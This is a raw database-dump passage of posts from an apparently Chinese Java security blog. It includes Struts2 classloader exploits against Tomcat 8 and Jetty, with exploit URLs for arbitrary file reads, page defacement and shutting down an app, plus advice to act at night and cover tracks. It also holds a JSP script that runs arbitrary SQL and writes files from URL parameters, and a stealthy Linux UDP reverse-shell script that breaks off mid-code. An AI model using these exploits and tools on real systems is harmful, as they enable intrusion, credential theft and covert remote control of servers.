一个final的对象，或者只是get方法返回一个对象，看起来像是只读的，其实对象的属性还是可以改的，这个只是对象的引用。</strong>\n你可以理解为指针指向的地址不能变，但是指向的那个对象的属性，是可以修改的。\n举例：\n<pre class=\"brush: java; gutter: true\">public User getUser()\n{\n     return this.user;\n}\npublic final User user;</pre>\n<p>这两处代码，其实真正返回给OGNL的都是user对象，对象的属性只要还有set方法，也都是可以被修改的。依然可以通过</p>\n<pre>url?user.name=xxx</pre>\n对user的name赋值。\n<h3>struts2运行在tomcat8.0.1rc5(2013,11月前)的任意文件读取漏洞</h3>\n在tomcat的环境下，classLoader会挂载一个resources，类名叫做“StandardRoot”，这个恐怖的东西，和tomcat的资源文件管理有关，debug看到的第一个属性就是非常危险的属性“allowLinking”。\n<a href=\"http://javaweb.org/wp-content/uploads/2014/03/2.png\"><img class=\"alignnone size-full wp-image-898\" title=\"2\" src=\"http://javaweb.org/wp-content/uploads/2014/03/2.png\" alt=\"\" width=\"574\" height=\"196\" /></a>\n这个事情，要从很久很久以前，struts修补的一个任意文件读取漏洞说起。\n<a href=\"http://struts.apache.org/release/2.3.x/docs/s2-004.html\">http://struts.apache.org/release/2.3.x/docs/s2-004.html</a>\n这是一个目录列表+文件读取漏洞，修补方案非常阴险，没有采用正规的手段，在框架层解决漏洞，而是利用了web容器的一个公约特性，jsp的web容器都遵守一个规则。\n当一个路径叫做“<code>/var/www/tomcat/webapps/demo/struts/../</code>”时，调用\n<div>\n<div id=\"highlighter_311222\">\n<table border=\"0\" cellspacing=\"0\" cellpadding=\"0\">\n<tbody>\n<tr>\n<td>\n<div>1</div></td>\n<td>\n<div>\n<div><code>getClassLoader().getResource(Path)</code></div>\n</div></td>\n</tr>\n</tbody>\n</table>\n</div>\n</div>\n返回路径为：\n<pre>/var/www/tomcat/webapps/demo/</pre>\n会把/../去掉，并且直接到达目的目录。\n这个叫做web容器特性，由web容器说了算，哪天web容器生气了，想变了，struts没有话语权。事实上，我一直喜欢讲框架安全，其中一条准则，就是“框架不要依靠web容器的特性做防御”，当然，今天不讨论这个话题，只是稍微做个铺垫。\n当时修补代码为：\n<a href=\"http://javaweb.org/wp-content/uploads/2014/03/3.png\"><img class=\"alignnone size-full wp-image-899\" title=\"3\" src=\"http://javaweb.org/wp-content/uploads/2014/03/3.png\" alt=\"\" width=\"473\" height=\"122\" /></a>\n用户提交<code>struts/../</code>时，<code>pathEnding=\"struts/../\"</code>。\n但是\n<pre>resourceUrl=&quot;/var/www/tomcat/webapps/demo/&quot;</pre>\n所以并不以pathEnding结尾。这种猥琐的做法，当时确实有效。\ntomcat8这个版本突然抽风了，重写了这个方法，还真的返回了\n<pre>/var/www/tomcat/webapps/demo/struts/../</pre>\n宣告沦陷。但是代码实际运行中，有个要求，就是“StandardRoot.allowLinking”必须是true（默认肯定是false）。\n机会来了。首先提交：\n<pre>http://localhost:8080/demo/t1.action?class.classLoader.resources.allowLinking=true</pre>\ndebug可以看到已经是true。\n然后按照以前的攻击方法：\n<a href=\"http://javaweb.org/wp-content/uploads/2014/03/4.png\"><img class=\"alignnone size-full wp-image-900\" title=\"4\" src=\"http://javaweb.org/wp-content/uploads/2014/03/4.png\" alt=\"\" width=\"730\" height=\"404\" /></a>\n就可以轻易读取任意文件，拿到数据库密码等等。\n这是两个漏洞结合的成果，非常遗憾的是，在RC5这个版本之后，有人给tomcat提交了一个需求，大概在2013年11月左右，tomcat的一个不重要的需求中（刚好这个需求涉及到资源文件相关代码），tomcat维护人员也许并没有意识到了这里存在读取资源文件的威胁，仅仅是把读取资源功能重新抽象规划了一次，结果顺带修补了这个漏洞，这问题产生的理由非常冤屈，修补的理由非常冤屈，最郁闷的是我，活生生的，0day没了。原本沾沾自喜以为可以大杀四方，结果大神打了个喷嚏。\n最后顺带说一句，这个漏洞只在windows下正常，linux下未知原因抽风。\n<h3>tomcat8下黑掉struts2应用的首页</h3>\n但是不要紧，tomcat是不可能给struts解决根本问题的，standardroot暴露出来，可以顺带影响很多东西。这个算DDOS么？其实我可以把“Hacked by kxlzx”写到你的应用首页去\n成因非常的“正常”，因为这个context属性代表了tomcat的<code>/conf/context.xml</code>文件的配置，我现在把path给你改了，那么struts去处理result时，会用路径拼接读取文件，现在目录名被改掉了，自然就读不到文件了，可惜这里不能00截断，否则又是一个任意文件读取漏洞。 下面是被干掉的网站，访问任何一个action，都会有如下效果：\n<a href=\"http://javaweb.org/wp-content/uploads/2014/03/5.png\"><img class=\"alignnone size-full wp-image-901\" title=\"5\" src=\"http://javaweb.org/wp-content/uploads/2014/03/5.png\" alt=\"\" width=\"716\" height=\"222\" /></a>\n看看debug的情况：\n<a href=\"http://javaweb.org/wp-content/uploads/2014/03/6.png\"><img class=\"alignnone size-full wp-image-902\" title=\"6\" src=\"http://javaweb.org/wp-content/uploads/2014/03/6.png\" alt=\"\" width=\"831\" height=\"389\" /></a>\n当前action叫做T1，会找到T1.jsp，但是现在目录名已经被修改了，所以报错。\n<a href=\"http://javaweb.org/wp-content/uploads/2014/03/7.png\"><img class=\"alignnone size-full wp-image-903\" title=\"7\" src=\"http://javaweb.org/wp-content/uploads/2014/03/7.png\" alt=\"\" width=\"356\" height=\"115\" /></a>\n这个问题可以影响tomcat8所有版本下运行的struts2，对了，你们得自己设计EXP哈，不要乱入。\n<h3>jetty7关机指令</h3>\n既然提到了web容器，只有研究tomcat，肯定不能覆盖大家关心的地方，于是我选择了另一个开源免费并且使用量大的轻量级web容器：jetty。\n现在先看看jetty是否有突破的口子。这次讲解路线反过来，先找个影响“不大”，各位“不是”很关心的漏洞。\n还是先看看web结构,使用老办法断点：\n<div>\n<div id=\"highlighter_101550\">\n<table border=\"0\" cellspacing=\"0\" cellpadding=\"0\">\n<tbody>\n<tr>\n<td>\n<div>1</div></td>\n<td>\n<div>\n<div><code>this</code><code>.getClass().getClassLoader();</code></div>\n</div></td>\n</tr>\n</tbody>\n</table>\n</div>\n</div>\n看到一个class：\n<div>\n<div id=\"highlighter_659526\">\n<table border=\"0\" cellspacing=\"0\" cellpadding=\"0\">\n<tbody>\n<tr>\n<td>\n<div>1</div></td>\n<td>\n<div>\n<div><code>org.eclipse.jetty.webapp.WebAppClassLoader</code></div>\n</div></td>\n</tr>\n</tbody>\n</table>\n</div>\n</div>\njetty的漏洞，没有tomcat那么含蓄，非常直接的，context就挂载在classLoader上。\n<a href=\"http://javaweb.org/wp-content/uploads/2014/03/8.png\"><img class=\"alignnone size-full wp-image-904\" title=\"8\" src=\"http://javaweb.org/wp-content/uploads/2014/03/8.png\" alt=\"\" width=\"580\" height=\"259\" /></a>\njetty在运行过程中，会去实时查看ContextHandler中的shutdown属性（webappcontext通过几层继承关系，继承了这个类，其实亲戚关系有八丈远），一旦发现true，直接就不工作了，这是典型的，使用一个状态判断业务是否同行。基于这个原理，只要如下访问，以后这个应用，就只剩下404了。\n<a href=\"http://javaweb.org/wp-content/uploads/2014/03/13.png\"><img class=\"alignnone size-full wp-image-1219\" src=\"http://javaweb.org/wp-content/uploads/2014/03/13.png\" alt=\"1\" width=\"730\" height=\"208\" /></a>\n无论是什么action，都只会返回这个错误，后续的执行，jetty都以为真的shutdown了。并且这个过程没有任何补救措施，只能管理员手工重启了，各位SA亲们，你们准备好了么？\n<h3>jetty任意文件下载</h3>\n我们让404为这个漏洞服务到底。\n事实上，下面说的这个问题发生在jetty上，tomcat真的是巧合的逃过一劫。\n我们看看jetty对于自定义错误文件的配置过程：\n<a href=\"http://javaweb.org/wp-content/uploads/2014/03/10.png\"><img class=\"alignnone size-full wp-image-906\" title=\"10\" src=\"http://javaweb.org/wp-content/uploads/2014/03/10.png\" alt=\"\" width=\"524\" height=\"222\" /></a>\n这段配置文件，可以自定义404错误文件，这里可以指定<code>/WEB-INF/</code>目录下的文件，一旦配置之后，由ErrorPageErrorHandler负责给errorPages（这也是个map）添加一个对应关系。这个类最终会被挂在到context中，那么依照这个漏洞的原理，我们可以层层调用，最终制定一种错误，比如404错误。\nJetty把errorHandler挂载到context上，errorHander有个errorPages属性，这其实是个map，代表错误页面，key是一个返回码数字，value就是错误后显示的文件。 所以打开：\n<a href=\"http://javaweb.org/wp-content/uploads/2014/03/11.png\"><img class=\"alignnone size-full wp-image-907\" title=\"11\" src=\"http://javaweb.org/wp-content/uploads/2014/03/11.png\" alt=\"\" width=\"700\" height=\"197\" /></a>\n访问图片中这条URL后，效果如下，任何一个不存在的页面都会显示web.xml的内容：\n<a href=\"http://javaweb.org/wp-content/uploads/2014/03/12.png\"><img class=\"alignnone size-full wp-image-908\" title=\"12\" src=\"http://javaweb.org/wp-content/uploads/2014/03/12.png\" alt=\"\" width=\"775\" height=\"444\" /></a>\n有了这个问题，就可以读取数据库文件，查看数据库密码，读取代码文件，查找隐藏的业务逻辑漏洞。注意，是任何人遇到404都可以看到这个页面，最好等夜深人静的时候再使用，用完了还得恢复原样。\n<h2>0x02 漏洞修补</h2>\n<hr />\n这漏洞已经被官方修补了，2012年发出来的老问题，只是没有单独提交官方而已，居然也能拖到现在，建议各位下定决心换个框架。\nfrom:<a href=\"http://security.alibaba.com/blog/blog_3.htm\">http://security.alibaba.com/blog/blog_3.htm</a>', null, '2014-03-16 20:32:29', '1', '527', null, '0', '2014-04-24 00:49:55'), ('930', '1', '3', 'jdbcdrivers.xml', '园长', 'jdbcdrivers.xml：\n<pre class=\"brush: xml; gutter: true\">&lt;JDBC-Drivers&gt;\n	&lt;Driver&gt;\n		&lt;DriverName&gt;IBM Type 2 Driver for DB2 7.x/8.x&lt;/DriverName&gt;\n		&lt;ClassName&gt;COM.ibm.db2.jdbc.app.DB2Driver&lt;/ClassName&gt;\n		&lt;URL&gt;jdbc:db2:[dbname]&lt;/URL&gt;\n		&lt;level&gt;system&lt;/level&gt;\n		&lt;TestSql&gt;SELECT COUNT(*) FROM SYSIBM.SYSTABLES&lt;/TestSql&gt;\n	&lt;/Driver&gt;\n	&lt;Driver&gt;\n		&lt;DriverName&gt;IBM Type 2 XA Driver for DB2 7.x/8.x&lt;/DriverName&gt;\n		&lt;ClassName&gt;COM.ibm.db2.jdbc.DB2XADataSource&lt;/ClassName&gt;\n		&lt;URL&gt;jdbc:db2:[dbname]&lt;/URL&gt;\n		&lt;level&gt;system&lt;/level&gt;\n		&lt;TestSql&gt;SELECT COUNT(*) FROM SYSIBM.SYSTABLES&lt;/TestSql&gt;\n	&lt;/Driver&gt;\n	&lt;Driver&gt;\n		&lt;DriverName&gt;IBM Type 4 Driver for DB2 7.x/8.x&lt;/DriverName&gt;\n		&lt;ClassName&gt;COM.ibm.db2.jdbc.net.DB2Driver&lt;/ClassName&gt;\n		&lt;URL&gt;jdbc:db2://[host]:6789/[dbName]&lt;/URL&gt;\n		&lt;level&gt;system&lt;/level&gt;\n		&lt;TestSql&gt;SELECT COUNT(*) FROM SYSIBM.SYSTABLES&lt;/TestSql&gt;\n	&lt;/Driver&gt;\n	&lt;Driver&gt;\n		&lt;DriverName&gt;IBM Type 4 Driver for Informix&lt;/DriverName&gt;\n		&lt;ClassName&gt;com.informix.jdbc.IfxDriver&lt;/ClassName&gt;\n		&lt;URL&gt;jdbc:informix-sqli://[host]:[1526]/[dbName]:informixserver=[myserver];user=[username];password=[password]\n		&lt;/URL&gt;\n		&lt;level&gt;system&lt;/level&gt;\n		&lt;TestSql&gt;SELECT COUNT(*) FROM SYSTABLES&lt;/TestSql&gt;\n	&lt;/Driver&gt;\n	&lt;Driver&gt;\n		&lt;DriverName&gt;IBM Type 4 XA Driver for Informix&lt;/DriverName&gt;\n		&lt;ClassName&gt;com.informix.jdbcx.IfxXADataSource&lt;/ClassName&gt;\n		&lt;URL&gt;jdbc:informix-sqli://[host]:[1526]/[dbName]:informixserver=[myserver];user=[username];password=[password]\n		&lt;/URL&gt;\n		&lt;level&gt;system&lt;/level&gt;\n		&lt;TestSql&gt;SELECT COUNT(*) FROM SYSTABLES&lt;/TestSql&gt;\n	&lt;/Driver&gt;\n	&lt;Driver&gt;\n		&lt;DriverName&gt;Derby Client Driver&lt;/DriverName&gt;\n		&lt;ClassName&gt;org.apache.derby.jdbc.ClientDriver&lt;/ClassName&gt;\n		&lt;URL&gt;jdbc:derby://[host]:[port]/[database]&lt;/URL&gt;\n		&lt;level&gt;system&lt;/level&gt;\n		&lt;TestSql&gt;SELECT COUNT(*) FROM SYS.SYSTABLES&lt;/TestSql&gt;\n	&lt;/Driver&gt;\n	&lt;Driver&gt;\n		&lt;DriverName&gt;Microsoft Type 4 XA Driver for MS SQL Server 2000\n		&lt;/DriverName&gt;\n		&lt;ClassName&gt;com.microsoft.sqlserver.jdbc.SQLServerDriver&lt;/ClassName&gt;\n		&lt;URL&gt;jdbc:microsoft:sqlserver://[host]:[1433];DatabaseName=[dbName]\n		&lt;/URL&gt;\n		&lt;level&gt;system&lt;/level&gt;\n		&lt;TestSql&gt;SELECT COUNT(*) FROM sysobjects&lt;/TestSql&gt;\n	&lt;/Driver&gt;\n	&lt;Driver&gt;\n		&lt;DriverName&gt;Microsoft Driver for MS SQL Server 2005+&lt;/DriverName&gt;\n		&lt;ClassName&gt;com.microsoft.jdbc.sqlserver.SQLServerDriver&lt;/ClassName&gt;\n		&lt;URL&gt;jdbc:sqlserver://[host]:[1433];DatabaseName=[dbName]&lt;/URL&gt;\n		&lt;level&gt;system&lt;/level&gt;\n		&lt;TestSql&gt;SELECT COUNT(*) FROM sysobjects&lt;/TestSql&gt;\n	&lt;/Driver&gt;\n	&lt;Driver&gt;\n		&lt;DriverName&gt;MySQL Connector/J Type 4 Driver for MySQL&lt;/DriverName&gt;\n		&lt;ClassName&gt;com.mysql.jdbc.Driver&lt;/ClassName&gt;\n		&lt;URL&gt;jdbc:mysql://[host]:[3306]/[dbName]?user=test&lt;/URL&gt;\n		&lt;level&gt;system&lt;/level&gt;\n		&lt;TestSql&gt;SELECT 1&lt;/TestSql&gt;\n	&lt;/Driver&gt;\n	&lt;Driver&gt;\n		&lt;DriverName&gt;MM.MySQL Type 4 Driver for MySQL&lt;/DriverName&gt;\n		&lt;ClassName&gt;org.gjt.mm.mysql.Driver&lt;/ClassName&gt;\n		&lt;URL&gt;jdbc:mysql://[host]:[3306]/[dbName]?user=test&lt;/URL&gt;\n		&lt;level&gt;system&lt;/level&gt;\n		&lt;TestSql&gt;SELECT 1&lt;/TestSql&gt;\n	&lt;/Driver&gt;\n	&lt;Driver&gt;\n		&lt;DriverName&gt;Oracle Type 4 Driver for Oracle 8.1.7,9.0.1,9.2.0\n		&lt;/DriverName&gt;\n		&lt;ClassName&gt;oracle.jdbc.driver.OracleDriver&lt;/ClassName&gt;\n		&lt;URL&gt;jdbc:oracle:thin:@[host]:[1521]:[dbName]&lt;/URL&gt;\n		&lt;level&gt;system&lt;/level&gt;\n		&lt;TestSql&gt;SELECT 1 from DUAL&lt;/TestSql&gt;\n	&lt;/Driver&gt;\n	&lt;Driver&gt;\n		&lt;DriverName&gt;Oracle Type 4 XA Driver for Oracle 8.1.7,9.0.1,9.2.0\n		&lt;/DriverName&gt;\n		&lt;ClassName&gt;oracle.jdbc.xa.client.OracleXADataSource&lt;/ClassName&gt;\n		&lt;URL&gt;jdbc:oracle:thin:@[host]:[1521]:[dbName]&lt;/URL&gt;\n		&lt;level&gt;system&lt;/level&gt;\n		&lt;TestSql&gt;SELECT 1 from DUAL&lt;/TestSql&gt;\n	&lt;/Driver&gt;\n	&lt;Driver&gt;\n		&lt;DriverName&gt;Oracle OCI Driver for Oracle 8.1.7,9.0.1,9.2.0\n		&lt;/DriverName&gt;\n		&lt;ClassName&gt;oracle.jdbc.driver.OracleDriver&lt;/ClassName&gt;\n		&lt;URL&gt;jdbc:oracle:oci8:@[dbName]&lt;/URL&gt;\n		&lt;level&gt;system&lt;/level&gt;\n		&lt;TestSql&gt;SELECT 1 from DUAL&lt;/TestSql&gt;\n	&lt;/Driver&gt;\n	&lt;Driver&gt;\n		&lt;DriverName&gt;Oracle OCI XA Driver for Oracle 8.1.7,9.0.1,9.2.0\n		&lt;/DriverName&gt;\n		&lt;ClassName&gt;oracle.jdbc.xa.client.OracleXADataSource&lt;/ClassName&gt;\n		&lt;URL&gt;jdbc:oracle:oci8:@[dbName]&lt;/URL&gt;\n		&lt;level&gt;system&lt;/level&gt;\n		&lt;TestSql&gt;SELECT 1 from DUAL&lt;/TestSql&gt;\n	&lt;/Driver&gt;\n	&lt;Driver&gt;\n		&lt;DriverName&gt;TongTech Driver Wrapper for Oracle &lt;/DriverName&gt;\n		&lt;ClassName&gt;com.tongweb.jdbc.OracleDriverWrapper&lt;/ClassName&gt;\n		&lt;URL&gt;jdbc:oracle:thin:@[host]:[1521]:[dbName]&lt;/URL&gt;\n		&lt;level&gt;system&lt;/level&gt;\n		&lt;TestSql&gt;SELECT * from duel&lt;/TestSql&gt;\n	&lt;/Driver&gt;\n	&lt;Driver&gt;\n		&lt;DriverName&gt;postgreSQL type 4 Driver for postgreSq&lt;/DriverName&gt;\n		&lt;ClassName&gt;org.postgresql.Driver&lt;/ClassName&gt;\n		&lt;URL&gt;jdbc:postgresql://[host]:[5432]/[dbName]&lt;/URL&gt;\n		&lt;level&gt;system&lt;/level&gt;\n		&lt;TestSql&gt;SELECT 1&lt;/TestSql&gt;\n	&lt;/Driver&gt;\n	&lt;Driver&gt;\n		&lt;DriverName&gt;Sybase type 4 Driver for Sybase 11.x&lt;/DriverName&gt;\n		&lt;ClassName&gt;com.sybase.jdbc.SybDriver&lt;/ClassName&gt;\n		&lt;URL&gt;jdbc:sybase:Tds:[host]:[2048]/[dbName]&lt;/URL&gt;\n		&lt;level&gt;system&lt;/level&gt;\n		&lt;TestSql&gt;SELECT COUNT(*) FROM sysobjects&lt;/TestSql&gt;\n	&lt;/Driver&gt;\n	&lt;Driver&gt;\n		&lt;DriverName&gt;Sybase type 4 XA Driver for Sybase 12.x&lt;/DriverName&gt;\n		&lt;ClassName&gt;com.sybase.jdbc2.jdbc.SybXADataSource&lt;/ClassName&gt;\n		&lt;URL&gt;jdbc:sybase:Tds:[host]:[2048]/[dbName]?charset=eucgb&lt;/URL&gt;\n		&lt;level&gt;system&lt;/level&gt;\n		&lt;TestSql&gt;SELECT COUNT(*) FROM sysobjects&lt;/TestSql&gt;\n	&lt;/Driver&gt;\n	&lt;Driver&gt;\n		&lt;DriverName&gt;HSQL JDBC Driver&lt;/DriverName&gt;\n		&lt;ClassName&gt;org.hsqldb.jdbcDriver&lt;/ClassName&gt;\n		&lt;URL&gt;jdbc:hsqldb:hsql://[host]:[9001]/default&lt;/URL&gt;\n		&lt;level&gt;system&lt;/level&gt;\n		&lt;TestSql&gt;SELECT 1&lt;/TestSql&gt;\n	&lt;/Driver&gt;\n	&lt;Driver&gt;\n		&lt;DriverName&gt;Sybase15 JDBC Driver&lt;/DriverName&gt;\n		&lt;ClassName&gt;com.sybase.jdbc3.jdbc.SybDriver&lt;/ClassName&gt;\n		&lt;URL&gt;jdbc:sybase:Tds:[host]:[5000]/[dbName]&lt;/URL&gt;\n		&lt;level&gt;system&lt;/level&gt;\n		&lt;TestSql&gt;SELECT COUNT(*) FROM sysobjects&lt;/TestSql&gt;\n	&lt;/Driver&gt;\n	&lt;Driver&gt;\n		&lt;DriverName&gt;Kingbase JDBC Driver&lt;/DriverName&gt;\n		&lt;ClassName&gt;com.kingbase.Driver&lt;/ClassName&gt;\n		&lt;URL&gt;jdbc:kingbase://[host]:[54321]/[dbName]&lt;/URL&gt;\n		&lt;level&gt;system&lt;/level&gt;\n		&lt;TestSql&gt;SELECT 1&lt;/TestSql&gt;\n	&lt;/Driver&gt;\n	&lt;Driver&gt;\n		&lt;DriverName&gt;dameng JDBC Driver&lt;/DriverName&gt;\n		&lt;ClassName&gt;dm.jdbc.driver.DmDriver&lt;/ClassName&gt;\n		&lt;URL&gt;jdbc:dm://127.0.0.1:12345/TEST&lt;/URL&gt;\n		&lt;level&gt;system&lt;/level&gt;\n		&lt;TestSql&gt;SELECT 1&lt;/TestSql&gt;\n	&lt;/Driver&gt;\n&lt;/JDBC-Drivers&gt;</pre>', null, '2014-03-18 19:30:41', '1', '527', null, '0', '2014-04-15 12:36:48'), ('933', '1', '3', 'jsp jdbc查询和备份脚本', '园长', '以前发的那个菜刀jsp脚本就有这个功能，只是在菜刀里面操作起来没有直接自己带参数那么好使。之前基本上只考虑了简单的连接方式，对于复杂点的Oracle的RAC并不实用。改进了下小脚本，查询参数直接在请求的URL传递就行了。可以直接是URL也可以是URL+USER+PASS,path参数如果传表示备份到指定路径，不传表示在当前页面显示。写文件默认指定的是UTF-8，如乱码需修改编码或连接字符串里面添加编码，如：jdbc:mysql://localhost:3306/dbname?useUnicode=true&amp;amp;characterEncoding=UTF-8。数据源方式连接已发过，都差不多不再发了。好了以后请小伙伴儿不要再问这个问题了，谢谢。\n<p>http://localhost:8080/Struts/index.jsp?driver=com.mysql.jdbc.Driver&amp;url=jdbc%3Amysql%3A%2f%2flocalhost%3A3306%2ftest%3Fuser%3Droot%26password%3D111111&amp;sql=select version(),user(),database()&amp;path=/Users/yz/1.txt</p>\n<p>http://localhost:8080/Struts/index.jsp?driver=com.mysql.jdbc.Driver&amp;url=jdbc%3Amysql%3A%2f%2flocalhost%3A3306%2ftest&amp;user=root&amp;pass=111111&amp;sql=select version(),user(),database()&amp;path=/Users/yz/1.txt</p>\n<p>如果是RAC直接写rac字符串。</p>\n<p><a href=\"http://javaweb.org/wp-content/uploads/2014/03/15.jpg\"><img class=\"alignnone size-full wp-image-934\" title=\"1\" src=\"http://javaweb.org/wp-content/uploads/2014/03/15.jpg\" alt=\"\" width=\"510\" height=\"289\" /></a></p>\n<p>带path参数:</p>\n<p><a href=\"http://javaweb.org/wp-content/uploads/2014/03/24.jpg\"><img class=\"alignnone size-full wp-image-935\" title=\"2\" src=\"http://javaweb.org/wp-content/uploads/2014/03/24.jpg\" alt=\"\" width=\"542\" height=\"223\" /></a></p>\n<p>源码：</p>\n<pre class=\"brush: java; gutter: true\">&lt;%@page import=&quot;java.io.*,java.util.*,java.sql.*&quot;%&gt;\n&lt;style&gt;\nth,td {\n	border: 1px solid #C1DAD7;\n	font-size: 12px;\n	padding: 6px;\n	color: #4f6b72;\n}\n&lt;/style&gt;\n&lt;%\n	try {\n		Class.forName(request.getParameter(&quot;driver&quot;));\n		String user = request.getParameter(&quot;user&quot;);\n		String sql = request.getParameter(&quot;sql&quot;);\n		Connection c = null;\n		if(user==null){\n			c = DriverManager.getConnection(request.getParameter(&quot;url&quot;));\n		}else{\n			c = DriverManager.getConnection(request.getParameter(&quot;url&quot;),request.getParameter(&quot;user&quot;),request.getParameter(&quot;pass&quot;));\n		}\n		BufferedWriter bw = null;\n		if (c != null) {\n			String path = request.getParameter(&quot;path&quot;);\n			boolean f = path != null &amp;&amp; !&quot;&quot;.equals(path);\n			ResultSet rs = c.prepareStatement(sql).executeQuery();\n			ResultSetMetaData d = rs.getMetaData();\n			out.println(&quot;&lt;font color=&#039;red&#039;&gt;WebPath:&quot;+request.getSession().getServletContext().getRealPath(&quot;/&quot;)+&quot;&lt;br/&gt;SQL:&quot;+sql+&quot;&lt;/font&gt;&lt;br/&gt;&lt;table&gt;&lt;tr&gt;&quot;);\n			if (f) {\n				bw = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(new File(request.getParameter(&quot;path&quot;))),&quot;UTF-8&quot;));\n			}\n			for (int i = 1; i &lt;= d.getColumnCount(); i++) {\n				if (f) {\n					bw.write(d.getColumnName(i) + &quot;(&quot;+ d.getColumnTypeName(i) + &quot;)&quot;);\n				} else {\n					out.println(&quot;&lt;th&gt;&quot; + d.getColumnName(i) + &quot;(&quot;+ d.getColumnTypeName(i) + &quot;)\\t&quot; + &quot;&lt;/th&gt;&quot;);\n				}\n			}\n			if (f) {\n				bw.newLine();\n			}\n			out.println(&quot;&lt;tr/&gt;&quot;);\n			while (rs.next()) {\n				out.println(&quot;&lt;tr&gt;&quot;);\n				for (int i = 1; i &lt;= d.getColumnCount(); i++) {\n					if (f) {\n						bw.write(rs.getObject(d.getColumnName(i)) + &quot; &quot;);\n					} else {\n						out.println(&quot;&lt;td&gt;&quot;+ rs.getObject(d.getColumnName(i))+ &quot;&lt;/td&gt;&quot;);\n					}\n				}\n				if (f) {\n					bw.newLine();\n				} else {\n					out.println(&quot;&lt;tr/&gt;&quot;);\n				}\n			}\n			if (f) {\n				bw.flush();\n				bw.close();\n				out.println(&quot;[/ok]&quot;);\n			}\n		} else {\n			out.println(&quot;Connection Error!&quot;);\n		}\n	} catch (Exception e) {\n		out.println(e.toString());\n	}\n%&gt;</pre>\n<p>导出格式：</p>\n<pre class=\"brush: actionscript3; gutter: true\">version()(VARCHAR)user()(VARCHAR)database()(VARCHAR)\n5.5.36 root@localhost test</pre>', null, '2014-03-19 00:00:28', '1', '532', null, '0', '2014-03-19 00:01:17'), ('961', '1', '3', 'DWR框架 获取请求数据问题', '园长', 'DWR框架可以直接js里面调用后端的Java类方法，看起来似乎非常cool但是其中隐藏了各种坑。dwr的实现方式是一个普通的servlet，拦截所有dwr请求。不同于其他框架的是dwr在参数传递的时候是个奇葩。估计很多人在用Struts2+dwr的时候经常会遇到dwr弹框：<strong>No data received from server</strong>。这个问题主要就是因为Struts2的Filter会调用apache-commons-fileupload的isMultipartContent()判断是否是文件上传请求。问题应该就出在这里，在commons-fileupload解析文件请求的时候会打开一个输入流，这个流一旦打开之后后面的dwr就没办法获取了。\n<p>DWR请求：</p>\n<pre class=\"brush: java; gutter: true\">POST /Struts/dwr/call/plaincall/Test.getData.dwr HTTP/1.1\nHost: localhost:8080\nConnection: keep-alive\nContent-Length: 215\nOrigin: http://localhost:8080\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.152 Safari/537.36\nContent-Type: text/plain\nAccept: */*\nReferer: http://localhost:8080/Struts/dwr/test/Test\nAccept-Encoding: gzip,deflate,sdch\nAccept-Language: zh-CN,zh;q=0.8,en;q=0.6\nCookie: JSESSIONID=1D13ABFF70F33FD4D31CB9A1F3538126; DWRSESSIONID=tFvo*cCk*4*c1gNuMNg0NOrSzjk; JSESSIONID=41920E755C29CEC7DE0E53C914FED043\ncallCount=1\nwindowName=\nc0-scriptName=Test\nc0-methodName=getData\nc0-id=0\nc0-param0=string:123\nbatchId=13\ninstanceId=0\npage=%2FStruts%2Fdwr%2Ftest%2FTest\nscriptSessionId=tFvo*cCk*4*c1gNuMNg0NOrSzjk/8$pVzjk-VV3A8hwlt</pre>\n<p>仔细一看你发发现dwr的请求挺坑爹的，以为普通的POST请求参数应该是这样的:\"id=1&amp;pass=123456....\"。而dwr的请求参数格式却是：callCount=1windowName=c0-scriptName=Testc0-methodName=getDatac0-id=0c0-param0=string:123batchId=3instanceId=0page=%2FStruts%2Fdwr%2Ftest%2FTestscriptSessionId=d2JCS0HfiZLKSpXm99aFeCy6Ajk/7Ay6Ajk-QphNGIXOi。这参数传到后端Server根本就没办法封装到请求里面去。这对依赖server解析后的Parameter的业务来说无疑是个坑，因为只能从ServletInputStream中获取dwr的请求参数...</p>\n<p>org.directwebremoting.dwrp.Batch.java的parseBasicPost方法:</p>\n<pre class=\"brush: actionscript3; gutter: true\">if (charEncoding != null){\n   in = new BufferedReader(new InputStreamReader(req.getInputStream(), charEncoding));\n}else{\n   in = new BufferedReader(new InputStreamReader(req.getInputStream()));\n}\n while (true){\n   String line = in.readLine();\n   ......省略......\n}</pre>\n<p><a href=\"http://javaweb.org/wp-content/uploads/2014/03/17.jpg\"><img class=\"alignnone size-full wp-image-962\" title=\"1\" src=\"http://javaweb.org/wp-content/uploads/2014/03/17.jpg\" alt=\"\" width=\"779\" height=\"625\" /></a></p>\n<p>既然知道了差异解决办法自然会很简单了。在处理ServletInputStream之前先复制一份流，把副本传递给应用就行了。而对于Struts2最简单的解决办法就是不拦截dwr的请求就ok了。</p>', null, '2014-03-21 17:57:25', '1', '595', null, '0', '2014-03-21 18:02:47'), ('979', '5', '12', '[zone-xsjswt]Linux UDP反弹shell脚本', 'Anonymous', '原文：<a href=\"http://zone.wooyun.org/content/11337\">Linux UDP反弹shell脚本，无端口，无残留文件，妈妈说标题要长才有人看，没人点赞的话不许回家吃饭</a> (标题太长，忍不住删了几个字)\n<p>* 无端口</p>\n<p>* 成功启动后无残余文件</p>\n<p>* 一般情况下没有UDP单包512字节的问题。当然你要是执行奇葩的命令我也没办法</p>\n<p>* 非交互式shell，也就是说，你不能用回车来写多行命令。这个问题不是不能解决，而是如果解决这个问题，会造成另外一个我不能忍受的问题。而且反正可以执行命令了，自己另外反弹一个可交互的shell就是了</p>\n<p>* 由于某些bash特性和某些我不能忍受的功能，某些子进程会在链接断开或者输入exit指令一段时间之后才会自动退出</p>\n<p>图就不贴了，大家自己玩</p>\n<pre class=\"brush: shell; gutter: true\">#!/bin/bash \nREVIP=127.0.0.1 \nREVPORT=8080 \nPIPE=/tmp/mysql-debug-mode \nPIPE2=/tmp/syslog \nTIMEOUT=20 \nrm -rf $PIPE \nmknod $PIPE p \nrm -rf $PIPE2 \nmknod $PIPE2 p \nfunction KeepAlive(){ \n        rm -rf $PIPE \n        rm -rf $PIPE2 \n        while [ 1 == 1 ] \n        do \n                sleep $TIMEOUT \n                echo Connection: keep-alive or die \n        done \n} \nfunction DoRealShell(){ \n        KeepAlive &amp; \n        PIDALIVE=$! \n        while read line \n        do \n                if [ &quot;$line&quot; == &quot;exit&quot; ] \n                then \n                        kill $PIDALIVE \n                        kill $PIDCONN \n                        kill $$ \n                        exit \n                fi \n                echo executing command: $line \n                eval $line \n        done \n        kill $PIDALIVE \n        kill $PIDCONN \n        kill $$ \n        exit \n} \nfunction 